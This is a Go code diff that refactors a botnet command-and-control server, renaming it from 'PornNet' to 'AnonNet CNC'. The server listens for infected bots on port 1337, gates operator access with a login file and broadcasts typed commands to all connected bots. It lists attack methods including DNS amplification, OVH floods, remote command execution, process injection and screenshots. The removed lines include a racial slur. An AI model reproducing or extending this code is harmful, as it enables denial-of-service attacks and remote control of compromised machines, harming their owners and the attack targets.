@@ -20,16 +20,16 @@ var (
 	bots      = make(map[int]*Bot)
 	botsMutex = sync.Mutex{}
 	nextBotID = 1
+	logins    = map[string]string{}
 )
 
-var loggedInUsers = map[string]string{}
-
-func Users() error {
+func loadUsers() error {
 	file, err := os.Open("login.txt")
 	if err != nil {
 		return err
 	}
 	defer file.Close()
+
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
@@ -38,87 +38,26 @@ func Users() error {
 		}
 		parts := strings.SplitN(line, ":", 2)
 		if len(parts) == 2 {
-			loggedInUsers[parts[0]] = parts[1]
+			logins[parts[0]] = parts[1]
 		}
 	}
 	return nil
 }
 
-func handleslaves(bot *Bot) {
-	defer func() {
-		botsMutex.Lock()
-		delete(bots, bot.id)
-		botsMutex.Unlock()
-		fmt.Printf("[*] Slaves %d disconnected\n", bot.id)
-		bot.conn.Close()
-	}()
-
-	fmt.Printf("[*] Slaves %d connected from %s\n", bot.id, bot.addr)
-
-	scanner := bufio.NewScanner(bot.conn)
-	for scanner.Scan() {
-		line := scanner.Text()
-		fmt.Printf("[Slaves %d] %s\n", bot.id, line)
-	}
-}
-
-func broadcast(cmd string) {
-	botsMutex.Lock()
-	defer botsMutex.Unlock()
-	for id, bot := range bots {
-		_, err := bot.conn.Write([]byte(cmd + "\n"))
-		if err != nil {
-			fmt.Printf("[!] Failed to send to slaves %d: %v\n", id, err)
-		}
-	}
-}
-
-func slaves() string {
-	botsMutex.Lock()
-	defer botsMutex.Unlock()
-	var sb strings.Builder
-	sb.WriteString("Connected SLAVES:\n")
-	for id, bot := range bots {
-		sb.WriteString(fmt.Sprintf("  ID %d - %s\n", id, bot.addr))
-	}
-	return sb.String()
-}
-
-func Methods() string {
-	return `Available attack methods:
-  dnsamp <ip> <duration>  - DNS Amplification
-  ovh <ip> <port> <dur>   - OVH attack
-  ovhack <ip> <port> <d>  - OVH hack attack
-  exec <cmd>              - Execute Windows command on bot
-  inject <pid>            - Inject shellcode into process ID
-  screenshot              - Capture screenshot`
-}
-
-func killer() string {
-	return "in progress"
-}
-
-func clear() {
-	fmt.Print("\033[H\033[2J")
-}
-
 func printSplash() {
-	clear()
 	fmt.Println(`
 
+   ___            _        _   _     
+  / _ \ _ __ __ _| |_ __ _| |_(_) ___ 
+ | | | | '__/ _` + "`" + ` | __/ _` + "`" + ` | __| |/ __|
+ | |_| | | | (_| | || (_| | |_| | (__ 
+  \___/|_|  \__,_|\__\__,_|\__|_|\___|
 
-
-██████╗  ██████╗ ██████╗ ███╗   ██╗███╗   ██╗███████╗████████╗
-██╔══██╗██╔═══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝╚══██╔══╝
-██████╔╝██║   ██║██████╔╝██╔██╗ ██║██╔██╗ ██║█████╗     ██║   
-██╔═══╝ ██║   ██║██╔══██╗██║╚██╗██║██║╚██╗██║██╔══╝     ██║   
-██║     ╚██████╔╝██║  ██║██║ ╚████║██║ ╚████║███████╗   ██║   
-╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝   ╚═╝                                                               
-                         PornNet V1
+         AnonNet CNC V1
 `)
 }
 
-func login() bool {
+func loginPrompt() bool {
 	reader := bufio.NewReader(os.Stdin)
 	for tries := 0; tries < 3; tries++ {
 		fmt.Print("Username: ")
@@ -129,77 +68,139 @@ func login() bool {
 		pass, _ := reader.ReadString('\n')
 		pass = strings.TrimSpace(pass)
 
-		if pw, ok := loggedInUsers[user]; ok && pw == pass {
-			fmt.Println("Login successful!")
+		if pw, ok := logins[user]; ok && pw == pass {
+			fmt.Println("Login successful!\n")
 			return true
 		} else {
-			fmt.Println("Invalid username or password.")
+			fmt.Println("Invalid username or password.\n")
 		}
 	}
 	return false
 }
 
+func handleBot(bot *Bot) {
+	defer func() {
+		botsMutex.Lock()
+		delete(bots, bot.id)
+		botsMutex.Unlock()
+		fmt.Printf("[*] Bot %d disconnected (%s)\n", bot.id, bot.addr)
+		bot.conn.Close()
+	}()
+
+	fmt.Printf("[+] Bot %d connected from %s\n", bot.id, bot.addr)
+
+	scanner := bufio.NewScanner(bot.conn)
+	for scanner.Scan() {
+		line := scanner.Text()
+		fmt.Printf("[Bot %d] %s\n", bot.id, line)
+	}
+}
+
+func listBots() {
+	botsMutex.Lock()
+	defer botsMutex.Unlock()
+	fmt.Println("Connected bots:")
+	for id, bot := range bots {
+		fmt.Printf("  ID %d - %s\n", id, bot.addr)
+	}
+	fmt.Printf("Total: %d bot(s)\n", len(bots))
+}
+
+func broadcastCommand(cmd string) {
+	botsMutex.Lock()
+	defer botsMutex.Unlock()
+	for id, bot := range bots {
+		_, err := bot.conn.Write([]byte(cmd + "\n"))
+		if err != nil {
+			fmt.Printf("[!] Failed to send to bot %d: %v\n", id, err)
+		}
+	}
+}
+
+func showMethods() {
+	fmt.Println(`Available attack methods:
+  dnsamp <ip> <duration>     - DNS Amplification
+  ovh <ip> <port> <duration> - OVH L4 attack
+  ovhack <ip> <port> <dur>   - OVH bypass method
+  exec <cmd>                 - Run system command on bot
+  inject <pid>               - Inject into process
+  screenshot                 - Capture screenshot`)
+}
+
+func botkiller() {
+	fmt.Println("Botkiller executed (placeholder).")
+}
+
 func main() {
-	if err := Users(); err != nil {
-		fmt.Println("Failed to load login.txt:", err)
+	if err := loadUsers(); err != nil {
+		fmt.Println("Error loading login.txt:", err)
 		return
 	}
 
 	printSplash()
 
-	if !login() {
-		fmt.Println("Too many login failures NIGGA IF U BROKE JS SAY SO!! Exiting.")
+	if !loginPrompt() {
+		fmt.Println("Too many failed login attempts. Exiting.")
 		return
 	}
 
 	ln, err := net.Listen("tcp", ":1337")
 	if err != nil {
-		fmt.Println("Listen error:", err)
+		fmt.Println("Failed to listen on port 1337:", err)
 		return
 	}
 	defer ln.Close()
 
-	fmt.Println("PornNet listening on port 1337")
+	fmt.Println("[*] CNC listening on port 1337")
 
 	go func() {
 		for {
+			conn, err := ln.Accept()
+			if err != nil {
+				fmt.Println("Accept error:", err)
+				continue
+			}
+
 			botsMutex.Lock()
-			count := len(bots)
+			bot := &Bot{
+				conn: conn,
+				id:   nextBotID,
+				addr: conn.RemoteAddr().String(),
+			}
+			bots[nextBotID] = bot
+			nextBotID++
 			botsMutex.Unlock()
-			fmt.Printf("\r[PornNet] Connected Slaves: %d > ", count)
-			time.Sleep(1 * time.Second)
+
+			go handleBot(bot)
 		}
 	}()
 
 	reader := bufio.NewReader(os.Stdin)
-
 	for {
-		fmt.Print("\n> ")
-		line, err := reader.ReadString('\n')
+		fmt.Print("[AnonNet]@~$ ")
+		cmdLine, err := reader.ReadString('\n')
 		if err != nil {
 			fmt.Println("Input error:", err)
 			continue
 		}
-		line = strings.TrimSpace(line)
-		if line == "" {
+		cmdLine = strings.TrimSpace(cmdLine)
+
+		switch cmdLine {
+		case "":
 			continue
-		}
-		switch line {
 		case "help":
-			fmt.Println("Commands: help, slaves, methods, botkiller, logout")
-		case "slaves":
-			fmt.Print(slaves())
+			fmt.Println("Commands: help, bots, methods, botkiller, logout")
+		case "bots":
+			listBots()
 		case "methods":
-			fmt.Print(Methods())
+			showMethods()
 		case "botkiller":
-			fmt.Println(killer())
-		case "logout":
+			botkiller()
+		case "logout", "exit", "quit":
 			fmt.Println("Logging out...")
 			return
 		default:
-			broadcast(line)
+			broadcastCommand(cmdLine)
 		}
 	}
-
 }
-
